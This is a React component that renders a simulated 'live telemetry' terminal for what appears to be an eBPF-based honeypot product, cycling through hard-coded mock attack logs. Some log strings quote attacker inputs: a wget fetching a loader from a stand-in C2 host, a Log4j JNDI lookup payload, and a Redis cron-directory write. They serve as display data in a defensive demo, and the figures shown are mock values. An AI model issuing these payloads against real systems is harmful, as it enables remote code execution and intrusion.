import React, { useState, useEffect, useRef } from 'react';
import {
  Terminal as TerminalIcon,
  Play,
  Pause,
  RotateCcw,
  ShieldCheck,
  Zap,
} from 'lucide-react';

interface LogEntry {
  id: string;
  timestamp: string;
  type: 'INTERCEPT' | 'SPLICE' | 'DECOY' | 'PROD' | 'CTI';
  sourceIp: string;
  destPort: string;
  action: string;
  detail: string;
  latency?: string;
}

const INITIAL_LOGS: LogEntry[] = [
  {
    id: 'log-1',
    timestamp: '14:32:01.102',
    type: 'INTERCEPT',
    sourceIp: '185.220.101.42:51294',
    destPort: ':22',
    action: 'SSH Brute-force attempt detected',
    detail: 'user="root" auth_attempt=failed_threshold_exceeded',
  },
  {
    id: 'log-2',
    timestamp: '14:32:01.103',
    type: 'SPLICE',
    sourceIp: '185.220.101.42',
    destPort: ':2222',
    action: 'bpf_sock_ops splice triggered',
    detail: 'Silent redirect to Alpine-Decoy-04 container',
    latency: '0.28ms',
  },
  {
    id: 'log-3',
    timestamp: '14:32:01.104',
    type: 'PROD',
    sourceIp: 'PROD_VPC_INGRESS',
    destPort: ':22',
    action: 'Production isolation confirmed',
    detail: '0 packets leaked to production kernel; connection diverted',
  },
  {
    id: 'log-4',
    timestamp: '14:32:01.298',
    type: 'DECOY',
    sourceIp: '185.220.101.42',
    destPort: ':2222',
    action: 'Attacker shell authenticated (Synthetic)',
    detail: 'Fake prompt spawned: root@srv-internal-db:~#',
  },
  {
    id: 'log-5',
    timestamp: '14:32:01.450',
    type: 'CTI',
    sourceIp: '185.220.101.42',
    destPort: 'STIX_STREAM',
    action: 'Attacker keystrokes logged & mapped',
    detail: 'cmd="wget http://c2.evil-botnet.cc/ldr.sh" -> MITRE T1059.004',
  },
];

const STREAM_POOL: Omit<LogEntry, 'id' | 'timestamp'>[] = [
  {
    type: 'INTERCEPT',
    sourceIp: '91.240.118.88:41920',
    destPort: ':443',
    action: 'Log4j / JNDI header probe identified',
    detail: 'Header: ${jndi:ldap://attacker-dns.org/a}',
  },
  {
    type: 'SPLICE',
    sourceIp: '91.240.118.88',
    destPort: ':8080',
    action: 'Kernel TCP splice to Java Honeyapp',
    detail: 'Inbound socket descriptor spliced without RST',
    latency: '0.34ms',
  },
  {
    type: 'DECOY',
    sourceIp: '91.240.118.88',
    destPort: ':8080',
    action: 'Synthetic vulnerable LDAP callback simulated',
    detail: 'Attacker delivered secondary payload stage (hash: 4f9b2c...a81)',
  },
  {
    type: 'CTI',
    sourceIp: '91.240.118.88',
    destPort: 'IOC_FEED',
    action: 'Extracted C2 IP and payload fingerprint',
    detail: 'IOC exported to SIEM feed in STIX 2.1 format',
  },
  {
    type: 'INTERCEPT',
    sourceIp: '194.26.29.112:58302',
    destPort: ':5432',
    action: 'PostgreSQL credential spraying detected',
    detail: 'Role: "postgres" | Database: "production_users"',
  },
  {
    type: 'SPLICE',
    sourceIp: '194.26.29.112',
    destPort: ':54322',
    action: 'Routed to Synthetic Postgres sandbox',
    detail: 'eBPF sockmap redirection active',
    latency: '0.31ms',
  },
  {
    type: 'PROD',
    sourceIp: 'PROD_K8S_INGRESS',
    destPort: ':443',
    action: 'Normal customer traffic passed through',
    detail: 'GET /api/v2/catalog -> 200 OK (latency: 1.1ms)',
  },
  {
    type: 'DECOY',
    sourceIp: '194.26.29.112',
    destPort: ':54322',
    action: 'Fake table schemas served to attacker',
    detail: 'Attacker executed "SELECT * FROM synthetic_customers;"',
  },
  {
    type: 'INTERCEPT',
    sourceIp: '45.154.255.71:49012',
    destPort: ':6379',
    action: 'Redis unauthenticated replication probe',
    detail: 'CONFIG SET dir /var/spool/cron/crontabs',
  },
  {
    type: 'SPLICE',
    sourceIp: '45.154.255.71',
    destPort: ':63799',
    action: 'Spliced into Redis ephemeral honeypot',
    detail: 'Filesystem isolated with memory-backed tmpfs',
    latency: '0.29ms',
  },
];

export const TrafficTerminal: React.FC = () => {
  const [logs, setLogs] = useState<LogEntry[]>(INITIAL_LOGS);
  const [isPaused, setIsPaused] = useState(false);
  const [splicedCount, setSplicedCount] = useState(1482);
  const logContainerRef = useRef<HTMLDivElement>(null);
  const poolIndexRef = useRef(0);

  // Auto-scroll on new log lines
  useEffect(() => {
    if (!isPaused && logContainerRef.current) {
      logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
    }
  }, [logs, isPaused]);

  // Periodic simulated real-time stream
  useEffect(() => {
    if (isPaused) return;

    const interval = setInterval(() => {
      const now = new Date();
      const hours = String(now.getHours()).padStart(2, '0');
      const mins = String(now.getMinutes()).padStart(2, '0');
      const secs = String(now.getSeconds()).padStart(2, '0');
      const ms = String(now.getMilliseconds()).padStart(3, '0');
      const timestamp = `${hours}:${mins}:${secs}.${ms}`;

      const nextTemplate = STREAM_POOL[poolIndexRef.current % STREAM_POOL.length];
      poolIndexRef.current += 1;

      const newEntry: LogEntry = {
        id: `log-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
        timestamp,
        ...nextTemplate,
      };

      setLogs((prev) => {
        const updated = [...prev, newEntry];
        return updated.length > 40 ? updated.slice(updated.length - 35) : updated;
      });

      if (newEntry.type === 'SPLICE') {
        setSplicedCount((c) => c + 1);
      }
    }, 2100);

    return () => clearInterval(interval);
  }, [isPaused]);

  const handleClear = () => {
    setLogs([]);
  };

  const getTypeBadge = (type: LogEntry['type']) => {
    switch (type) {
      case 'INTERCEPT':
        return (
          <span className="text-amber-400 font-bold bg-amber-400/10 px-1.5 py-0.5 rounded text-[9px] sm:text-[10px] tracking-wider">
            INTERCEPT
          </span>
        );
      case 'SPLICE':
        return (
          <span className="text-emerald-400 font-bold bg-emerald-400/10 px-1.5 py-0.5 rounded text-[9px] sm:text-[10px] tracking-wider">
            eBPF-SPLICE
          </span>
        );
      case 'DECOY':
        return (
          <span className="text-cyan-400 font-bold bg-cyan-400/10 px-1.5 py-0.5 rounded text-[9px] sm:text-[10px] tracking-wider">
            DECOY-TRAP
          </span>
        );
      case 'PROD':
        return (
          <span className="text-emerald-300 font-bold bg-emerald-500/15 px-1.5 py-0.5 rounded text-[9px] sm:text-[10px] tracking-wider">
            PROD-SAFE
          </span>
        );
      case 'CTI':
        return (
          <span className="text-purple-400 font-bold bg-purple-400/10 px-1.5 py-0.5 rounded text-[9px] sm:text-[10px] tracking-wider">
            INTEL-IOC
          </span>
        );
    }
  };

  return (
    <section
      id="live-traffic-terminal"
      className="w-full max-w-5xl mx-auto px-3 sm:px-6 lg:px-8 py-4 sm:py-8"
    >
      {/* Retro-cyber terminal container */}
      <div className="bg-[#070b12] border border-white/[0.12] rounded-xl shadow-2xl overflow-hidden font-mono text-slate-300">
        
        {/* Terminal Header Bar */}
        <div className="bg-[#0d131f] px-3 sm:px-4 py-2 sm:py-2.5 border-b border-white/[0.08] flex items-center justify-between select-none gap-2">
          {/* Left: Window Controls + Title */}
          <div className="flex items-center gap-2 sm:gap-3 min-w-0">
            <div className="flex items-center gap-1 sm:gap-1.5 shrink-0">
              <span className="w-2 h-2 sm:w-2.5 sm:h-2.5 rounded-full bg-rose-500/80 inline-block" />
              <span className="w-2 h-2 sm:w-2.5 sm:h-2.5 rounded-full bg-amber-500/80 inline-block" />
              <span className="w-2 h-2 sm:w-2.5 sm:h-2.5 rounded-full bg-emerald-500/80 inline-block" />
            </div>
            <div className="flex items-center gap-1.5 sm:gap-2 text-slate-400 text-xs min-w-0">
              <TerminalIcon className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-emerald-400 shrink-0" />
              <span className="text-slate-200 font-semibold tracking-tight text-[11px] sm:text-xs truncate">
                trinetra-kernel-stream
              </span>
              <span className="text-slate-500 hidden md:inline text-[11px]">
                --sockops-redirect (tty0)
              </span>
            </div>
          </div>

          {/* Right: Live indicator & Controls */}
          <div className="flex items-center gap-1.5 sm:gap-2.5 shrink-0">
            <div className="flex items-center gap-1.5 px-1.5 sm:px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/20 text-emerald-400">
              <span
                className={`w-1.5 h-1.5 rounded-full bg-emerald-400 ${
                  isPaused ? 'opacity-50' : 'animate-ping'
                }`}
              />
              <span className="font-semibold text-[9px] sm:text-[10px] tracking-wider">
                {isPaused ? 'PAUSED' : (
                  <>
                    <span className="sm:hidden">LIVE</span>
                    <span className="hidden sm:inline">LIVE TELEMETRY</span>
                  </>
                )}
              </span>
            </div>

            <button
              onClick={() => setIsPaused(!isPaused)}
              title={isPaused ? 'Resume log stream' : 'Pause log stream'}
              className="p-1 sm:p-1.5 rounded text-slate-400 hover:text-white hover:bg-white/[0.08] transition-colors cursor-pointer"
            >
              {isPaused ? <Play className="w-3 h-3 sm:w-3.5 sm:h-3.5" /> : <Pause className="w-3 h-3 sm:w-3.5 sm:h-3.5" />}
            </button>

            <button
              onClick={handleClear}
              title="Clear terminal logs"
              className="p-1 sm:p-1.5 rounded text-slate-400 hover:text-white hover:bg-white/[0.08] transition-colors cursor-pointer"
            >
              <RotateCcw className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
            </button>
          </div>
        </div>

        {/* Terminal Scrolling Log Body */}
        <div
          ref={logContainerRef}
          className="h-52 sm:h-64 overflow-y-auto overflow-x-hidden p-2.5 sm:p-4 space-y-2 bg-[#06090e]/95 scroll-smooth border-b border-white/[0.06] text-[10px] sm:text-xs leading-relaxed"
          style={{
            backgroundImage:
              'linear-gradient(rgba(16, 185, 129, 0.02) 50%, rgba(0, 0, 0, 0.25) 50%)',
            backgroundSize: '100% 4px',
          }}
        >
          {logs.length === 0 ? (
            <div className="text-slate-500 py-10 sm:py-12 text-center text-xs">
              Logs cleared. Waiting for next in-kernel socket event...
            </div>
          ) : (
            logs.map((log) => (
              <div
                key={log.id}
                className="flex flex-col sm:flex-row sm:items-baseline gap-1 sm:gap-2.5 hover:bg-white/[0.02] p-1 sm:p-0.5 rounded transition-colors"
              >
                {/* Mobile Top Row / Desktop Inlined Metadata */}
                <div className="flex items-center gap-1.5 flex-wrap sm:flex-nowrap shrink-0">
                  <span className="text-slate-500 shrink-0 select-none text-[9px] sm:text-[11px]">
                    [{log.timestamp}]
                  </span>
                  <span className="shrink-0">{getTypeBadge(log.type)}</span>
                  <span className="text-slate-400 shrink-0 font-medium text-[10px] sm:text-xs">
                    <span className="text-slate-200">{log.sourceIp}</span>
                    <span className="text-emerald-400"> &rarr; {log.destPort}</span>
                  </span>
                  {log.latency && (
                    <span className="text-emerald-400 text-[9px] font-medium sm:hidden ml-auto">
                      [{log.latency}]
                    </span>
                  )}
                </div>

                {/* Action & Detail Description with Word Break */}
                <div className="text-slate-300 pl-2 sm:pl-0 border-l border-white/[0.08] sm:border-l-0 break-words min-w-0">
                  <span>{log.action}</span>
                  <span className="text-slate-400 block sm:inline sm:ml-1.5 text-[9px] sm:text-[11px] break-all">
                    ({log.detail})
                  </span>
                </div>

                {/* Latency metric for desktop */}
                {log.latency && (
                  <span className="text-emerald-400 text-[10px] shrink-0 font-medium sm:ml-auto hidden sm:inline">
                    [{log.latency}]
                  </span>
                )}
              </div>
            ))
          )}

          {/* Active Terminal Cursor */}
          <div className="flex items-center gap-1.5 sm:gap-2 pt-1 text-slate-500 overflow-hidden">
            <span className="text-emerald-400 shrink-0">&gt;</span>
            <span className="text-[10px] sm:text-[11px] text-slate-400 truncate">
              kernel-bpf::listening on sock_ops hooks (auto-divert armed)
            </span>
            <span className="inline-block w-1.5 sm:w-2 h-3 sm:h-3.5 bg-emerald-400 animate-pulse shrink-0" />
          </div>
        </div>

        {/* Terminal Status Bar (Subtle Bottom HUD) */}
        <div className="bg-[#0b1019] px-3 sm:px-4 py-2 flex flex-col xs:flex-row sm:flex-row items-start xs:items-center justify-between gap-2 text-[10px] sm:text-[11px] text-slate-400">
          <div className="flex items-center gap-3 sm:gap-4 w-full xs:w-auto justify-between xs:justify-start">
            <div className="flex items-center gap-1.5">
              <Zap className="w-3 h-3 text-emerald-400 shrink-0" />
              <span>Spliced:</span>
              <strong className="text-white font-semibold">{splicedCount.toLocaleString()}</strong>
            </div>
            <div className="flex items-center gap-1.5">
              <span>Latency:</span>
              <strong className="text-emerald-400 font-semibold">&lt; 0.35ms</strong>
            </div>
          </div>

          <div className="flex items-center gap-1.5 text-emerald-400">
            <ShieldCheck className="w-3.5 h-3.5 shrink-0" />
            <span className="text-slate-300">Production Isolation:</span>
            <strong className="font-semibold">100%</strong>
          </div>
        </div>

      </div>
    </section>
  );
};
